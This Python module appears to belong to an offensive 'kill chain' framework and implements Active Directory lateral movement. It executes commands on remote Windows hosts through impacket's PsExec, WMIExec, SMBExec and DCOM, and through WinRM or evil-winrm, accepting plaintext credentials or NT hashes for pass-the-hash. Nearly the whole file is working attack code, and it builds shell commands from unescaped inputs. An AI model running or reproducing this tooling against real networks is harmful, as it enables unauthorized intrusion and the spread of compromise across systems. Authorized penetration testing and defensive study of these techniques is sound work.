#!/usr/bin/env python3
"""
Active Directory lateral movement module for the OCTOPUS kill chain.

Provides Windows-native lateral movement via PsExec, WMIExec, SMBExec,
WinRM, and DCOM.  All methods use impacket as the primary backend with
CLI tool fallbacks.

Usage::

    from core.killchain.ad.lateral import psexec, wmiexec
    result = psexec("10.10.10.100", {"user": "admin", "password": "P@ss", "domain": "CORP"})
"""

import logging
import shutil
import subprocess
from typing import Optional

# ── Logging ──────────────────────────────────────────────────────────────
logger = logging.getLogger("octopus.killchain.ad.lateral")

# ── ANSI Colors ──────────────────────────────────────────────────────────
C_GREEN = "\033[92m"
C_YELLOW = "\033[93m"
C_RED = "\033[91m"
C_CYAN = "\033[96m"
C_GREY = "\033[90m"
C_BLUE = "\033[94m"
C_MAGENTA = "\033[95m"
C_RESET = "\033[0m"

# ── Constants ────────────────────────────────────────────────────────────
IMPACKET_TIMEOUT = 120
CLI_TIMEOUT = 180
DEFAULT_SHARE = "C$"
SMB_PORT = 445
WINRM_PORT = 5985
WINRM_SSL_PORT = 5986
DCOM_PORT = 135


# Internal helpers

def _normalize_creds(creds: Optional[dict[str, str]]) -> dict[str, str]:
    """Return a dict with guaranteed keys: user, password, domain, nthash."""
    defaults: dict[str, str] = {"user": "", "password": "", "domain": "", "nthash": ""}
    if creds:
        defaults.update(creds)
    return defaults


def _run_cli(cmd: str, timeout: int = CLI_TIMEOUT) -> str:
    """Execute a shell command and return combined stdout+stderr."""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout,
        )
        return (result.stdout + result.stderr).strip()
    except subprocess.TimeoutExpired:
        logger.warning("CLI command timed out: %s", cmd[:80])
        return f"[!] Command timed out after {timeout}s"
    except FileNotFoundError:
        return "[!] Command not found"
    except Exception as exc:
        logger.error("CLI command failed: %s", exc)
        return f"[!] Command error: {exc}"


def _impacket_auth_string(creds: dict[str, str]) -> str:
    """Build ``DOMAIN/user:password`` string for impacket CLI tools."""
    domain = creds["domain"]
    user = creds["user"]
    password = creds["password"]
    if domain:
        return f"{domain}/{user}:{password}"
    return f"{user}:{password}"


def _impacket_hash_arg(creds: dict[str, str]) -> str:
    """Return ``-hashes :NTHASH`` flag if nthash is available."""
    if creds.get("nthash"):
        return f"-hashes :{creds['nthash']}"
    return ""


# PsExec

def psexec(
    target: str,
    creds: Optional[dict[str, str]] = None,
    command: str = "whoami && hostname && ipconfig",
) -> str:
    """Execute a command via PsExec (impacket).

    Uploads a service binary to the ``ADMIN$`` share and creates a
    Windows service to execute the command.  Provides SYSTEM-level access.

    Args:
        target: Target IP or hostname.
        creds: Credential dict (``user``, ``password``, ``domain``, optional ``nthash``).
        command: Command to execute (default: identity check).

    Returns:
        Formatted result string with command output.
    """
    creds = _normalize_creds(creds)
    print(f"\n  {C_RED}[LATERAL] PsExec — {target}{C_RESET}")
    output = f"[PSEXEC — {target}]\n{'═' * 60}\n\n"

    if not creds["user"]:
        output += "[!] Credentials required for PsExec.\n"
        return output

    # ── Try impacket Python module ────────────────────────────────
    try:
        from impacket.examples.psexec import PSEXEC  # type: ignore[import-untyped]

        logger.info("PsExec via impacket: %s@%s", creds["user"], target)
        executer = PSEXEC(
            command,
            username=creds["user"],
            password=creds["password"],
            domain=creds["domain"],
            hashes=f":{creds['nthash']}" if creds["nthash"] else None,
            port=SMB_PORT,
        )
        exec_output = executer.run(target)

        output += "[+] PsExec successful\n"
        output += f"    User:    {creds['domain']}\\{creds['user']}\n"
        output += f"    Command: {command}\n\n"
        output += f"[COMMAND OUTPUT]\n{exec_output[:5000]}\n"
        print(f"    {C_GREEN}[+] PsExec command executed!{C_RESET}")
        return output
    except ImportError:
        logger.debug("impacket psexec not importable — trying CLI")
    except Exception as exc:
        logger.warning("impacket PsExec failed: %s", exc)
        output += f"[!] impacket error: {exc}\n"

    # ── Fall back to CLI ──────────────────────────────────────────
    cli_bin = shutil.which("psexec.py") or shutil.which("impacket-psexec")
    if cli_bin:
        auth = _impacket_auth_string(creds)
        hash_arg = _impacket_hash_arg(creds)
        cmd = f'{cli_bin} "{auth}@{target}" {hash_arg} -codec utf-8 "{command}"'
        cli_out = _run_cli(cmd, timeout=IMPACKET_TIMEOUT)
        output += f"(via CLI)\n{cli_out[:5000]}\n"
    else:
        output += "[!] No impacket psexec available. Install impacket.\n"

    return output


# WMIExec

def wmiexec(
    target: str,
    creds: Optional[dict[str, str]] = None,
    command: str = "whoami && hostname && ipconfig",
) -> str:
    """Execute a command via WMI (Windows Management Instrumentation).

    Uses DCOM to connect to the WMI provider and execute commands.
    Less noisy than PsExec — does not create a service.

    Args:
        target: Target IP or hostname.
        creds: Credential dict.
        command: Command to execute.

    Returns:
        Formatted result string with command output.
    """
    creds = _normalize_creds(creds)
    print(f"\n  {C_BLUE}[LATERAL] WMIExec — {target}{C_RESET}")
    output = f"[WMIEXEC — {target}]\n{'═' * 60}\n\n"

    if not creds["user"]:
        output += "[!] Credentials required for WMIExec.\n"
        return output

    # ── Try impacket Python module ────────────────────────────────
    try:
        from impacket.examples.wmiexec import WMIEXEC  # type: ignore[import-untyped]

        logger.info("WMIExec via impacket: %s@%s", creds["user"], target)
        executer = WMIEXEC(
            command,
            username=creds["user"],
            password=creds["password"],
            domain=creds["domain"],
            hashes=f":{creds['nthash']}" if creds["nthash"] else "",
            share=DEFAULT_SHARE,
        )
        exec_output = executer.run(target, target)

        output += "[+] WMIExec successful\n"
        output += f"    User:    {creds['domain']}\\{creds['user']}\n"
        output += f"    Command: {command}\n\n"
        output += f"[COMMAND OUTPUT]\n{exec_output[:5000]}\n"
        print(f"    {C_GREEN}[+] WMIExec command executed!{C_RESET}")
        return output
    except ImportError:
        logger.debug("impacket wmiexec not importable — trying CLI")
    except Exception as exc:
        logger.warning("impacket WMIExec failed: %s", exc)
        output += f"[!] impacket error: {exc}\n"

    # ── Fall back to CLI ──────────────────────────────────────────
    cli_bin = shutil.which("wmiexec.py") or shutil.which("impacket-wmiexec")
    if cli_bin:
        auth = _impacket_auth_string(creds)
        hash_arg = _impacket_hash_arg(creds)
        cmd = f'{cli_bin} "{auth}@{target}" {hash_arg} -codec utf-8 "{command}"'
        cli_out = _run_cli(cmd, timeout=IMPACKET_TIMEOUT)
        output += f"(via CLI)\n{cli_out[:5000]}\n"
    else:
        output += "[!] No impacket wmiexec available. Install impacket.\n"

    return output


# SMBExec

def smbexec(
    target: str,
    creds: Optional[dict[str, str]] = None,
    command: str = "whoami && hostname && ipconfig",
) -> str:
    """Execute a command via SMBExec.

    Creates a Windows service that writes command output to a temp file,
    then reads the file over SMB.  Does not drop a binary on disk.

    Args:
        target: Target IP or hostname.
        creds: Credential dict.
        command: Command to execute.

    Returns:
        Formatted result string with command output.
    """
    creds = _normalize_creds(creds)
    print(f"\n  {C_BLUE}[LATERAL] SMBExec — {target}{C_RESET}")
    output = f"[SMBEXEC — {target}]\n{'═' * 60}\n\n"

    if not creds["user"]:
        output += "[!] Credentials required for SMBExec.\n"
        return output

    # ── Try impacket Python module ────────────────────────────────
    try:
        from impacket.examples.smbexec import SMBEXEC  # type: ignore[import-untyped]

        logger.info("SMBExec via impacket: %s@%s", creds["user"], target)
        executer = SMBEXEC(
            command,
            username=creds["user"],
            password=creds["password"],
            domain=creds["domain"],
            hashes=f":{creds['nthash']}" if creds["nthash"] else "",
            share=DEFAULT_SHARE,
            port=SMB_PORT,
        )
        exec_output = executer.run(target, target)

        output += "[+] SMBExec successful\n"
        output += f"    User:    {creds['domain']}\\{creds['user']}\n"
        output += f"    Command: {command}\n\n"
        output += f"[COMMAND OUTPUT]\n{exec_output[:5000]}\n"
        print(f"    {C_GREEN}[+] SMBExec command executed!{C_RESET}")
        return output
    except ImportError:
        logger.debug("impacket smbexec not importable — trying CLI")
    except Exception as exc:
        logger.warning("impacket SMBExec failed: %s", exc)
        output += f"[!] impacket error: {exc}\n"

    # ── Fall back to CLI ──────────────────────────────────────────
    cli_bin = shutil.which("smbexec.py") or shutil.which("impacket-smbexec")
    if cli_bin:
        auth = _impacket_auth_string(creds)
        hash_arg = _impacket_hash_arg(creds)
        cmd = f'{cli_bin} "{auth}@{target}" {hash_arg} -codec utf-8 "{command}"'
        cli_out = _run_cli(cmd, timeout=IMPACKET_TIMEOUT)
        output += f"(via CLI)\n{cli_out[:5000]}\n"
    else:
        output += "[!] No impacket smbexec available. Install impacket.\n"

    return output


# WinRM

def winrm_exec(
    target: str,
    creds: Optional[dict[str, str]] = None,
    command: str = "whoami && hostname && ipconfig",
) -> str:
    """Execute a command via Windows Remote Management (WinRM).

    Uses the ``pywinrm`` library (or ``evil-winrm`` CLI) to connect to
    the WinRM service on port 5985/5986.

    Args:
        target: Target IP or hostname.
        creds: Credential dict.
        command: Command to execute.

    Returns:
        Formatted result string with command output.
    """
    creds = _normalize_creds(creds)
    print(f"\n  {C_MAGENTA}[LATERAL] WinRM — {target}{C_RESET}")
    output = f"[WINRM — {target}]\n{'═' * 60}\n\n"

    if not creds["user"]:
        output += "[!] Credentials required for WinRM.\n"
        return output

    # ── Try pywinrm ───────────────────────────────────────────────
    try:
        import winrm as pywinrm  # lazy import

        logger.info("WinRM via pywinrm: %s@%s", creds["user"], target)

        # Try HTTP (5985), then HTTPS (5986)
        for scheme, port in [("http", WINRM_PORT), ("https", WINRM_SSL_PORT)]:
            try:
                session = pywinrm.Session(
                    f"{scheme}://{target}:{port}/wsman",
                    auth=(
                        f"{creds['domain']}\\{creds['user']}" if creds["domain"]
                        else creds["user"],
                        creds["password"],
                    ),
                    transport="ntlm",
                    server_cert_validation="ignore",
                )
                result = session.run_cmd(command)
                cmd_output = result.std_out.decode("utf-8", errors="replace")
                cmd_err = result.std_err.decode("utf-8", errors="replace")

                output += f"[+] WinRM successful ({scheme}:{port})\n"
                output += f"    User:    {creds['domain']}\\{creds['user']}\n"
                output += f"    Command: {command}\n"
                output += f"    Status:  {result.status_code}\n\n"
                output += f"[COMMAND OUTPUT]\n{cmd_output[:5000]}\n"
                if cmd_err:
                    output += f"\n[STDERR]\n{cmd_err[:2000]}\n"
                print(f"    {C_GREEN}[+] WinRM command executed!{C_RESET}")
                return output
            except Exception as exc:
                logger.debug("WinRM %s:%d failed: %s", scheme, port, exc)
                continue

        output += "[!] WinRM connection failed on both HTTP and HTTPS.\n"
    except ImportError:
        logger.debug("pywinrm not available — trying evil-winrm CLI")

    # ── Fall back to evil-winrm CLI ───────────────────────────────
    evil_bin = shutil.which("evil-winrm")
    if evil_bin:
        cmd = (
            f'{evil_bin} -i {target} -u "{creds["user"]}" '
            f'-p "{creds["password"]}" -c "{command}"'
        )
        cli_out = _run_cli(cmd, timeout=IMPACKET_TIMEOUT)
        output += f"(via evil-winrm CLI)\n{cli_out[:5000]}\n"
    else:
        output += "[!] No WinRM client available. Install pywinrm or evil-winrm.\n"

    return output


# DCOM Exec

def dcom_exec(
    target: str,
    creds: Optional[dict[str, str]] = None,
    command: str = "whoami && hostname && ipconfig",
) -> str:
    """Execute a command via DCOM (Distributed COM).

    Uses impacket's ``dcomexec`` which leverages MMC20.Application,
    ShellWindows, or ShellBrowserWindow DCOM objects.

    Args:
        target: Target IP or hostname.
        creds: Credential dict.
        command: Command to execute.

    Returns:
        Formatted result string with command output.
    """
    creds = _normalize_creds(creds)
    print(f"\n  {C_MAGENTA}[LATERAL] DCOM Exec — {target}{C_RESET}")
    output = f"[DCOM EXEC — {target}]\n{'═' * 60}\n\n"

    if not creds["user"]:
        output += "[!] Credentials required for DCOM execution.\n"
        return output

    # ── Try impacket Python module ────────────────────────────────
    try:
        from impacket.examples.dcomexec import DCOMEXEC  # type: ignore[import-untyped]

        logger.info("DCOM exec via impacket: %s@%s", creds["user"], target)

        # Try different DCOM objects
        for dcom_object in ("MMC20", "ShellWindows", "ShellBrowserWindow"):
            try:
                executer = DCOMEXEC(
                    command,
                    username=creds["user"],
                    password=creds["password"],
                    domain=creds["domain"],
                    hashes=f":{creds['nthash']}" if creds["nthash"] else "",
                    share=DEFAULT_SHARE,
                    dcom=dcom_object,
                )
                exec_output = executer.run(target, target)

                output += f"[+] DCOM exec successful (object: {dcom_object})\n"
                output += f"    User:    {creds['domain']}\\{creds['user']}\n"
                output += f"    Command: {command}\n\n"
                output += f"[COMMAND OUTPUT]\n{exec_output[:5000]}\n"
                print(f"    {C_GREEN}[+] DCOM command executed via {dcom_object}!{C_RESET}")
                return output
            except Exception as exc:
                logger.debug("DCOM %s failed: %s", dcom_object, exc)
                continue

        output += "[!] All DCOM objects failed.\n"
    except ImportError:
        logger.debug("impacket dcomexec not importable — trying CLI")
    except Exception as exc:
        logger.warning("impacket DCOM exec failed: %s", exc)
        output += f"[!] impacket error: {exc}\n"

    # ── Fall back to CLI ──────────────────────────────────────────
    cli_bin = shutil.which("dcomexec.py") or shutil.which("impacket-dcomexec")
    if cli_bin:
        auth = _impacket_auth_string(creds)
        hash_arg = _impacket_hash_arg(creds)
        cmd = (
            f'{cli_bin} "{auth}@{target}" {hash_arg} '
            f'-codec utf-8 -object MMC20 "{command}"'
        )
        cli_out = _run_cli(cmd, timeout=IMPACKET_TIMEOUT)
        output += f"(via CLI)\n{cli_out[:5000]}\n"
    else:
        output += "[!] No impacket dcomexec available. Install impacket.\n"

    return output
